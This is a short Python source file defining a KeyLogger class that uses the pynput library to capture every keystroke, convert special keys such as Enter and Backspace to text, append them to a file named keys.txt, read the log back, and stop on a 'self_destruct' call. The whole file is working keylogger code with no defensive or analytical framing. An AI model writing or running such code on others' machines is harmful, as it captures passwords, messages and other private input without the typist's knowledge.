from pynput.keyboard import Listener

"""This KeyLogger class contains functions that start the logger, write key strokes to a text file, and stops itself upon a self_destruct command"""
class KeyLogger:

    #logs a keypress by writing the key to a file. Certain keystrokes must be validated to be stored such as a backspace, enter, shift, space, caps_lock, etc.
    def on_press(key):
        k = str(key)
        k = k.replace("'", " ")
        k = k.replace("Key.backspace", "Backspace")
        k = k.replace("Key.enter", "\n")
        k = k.replace("Key.shift", "Shift")
        k = k.replace("Key.space", " ")
        k = k.replace("Key.caps_lock", "Caps Lock")
        
        file = open("keys.txt", "a")
        file.write(k)
        file.write('\n')
        file.close()

    #starts a listener for keystrokes and calls the on_press function each time to logging keys
    def start(self):
        with Listener(on_press=KeyLogger.on_press) as self.listener:
            self.listener.join()
    
    #returns keystrokes as a string
    def readkeys(self):
        with open('keys.txt', 'r') as file:
            return file.read().rstrip()

    #stop recording keystrokes
    def self_destruct(self):
        self.listener.stop()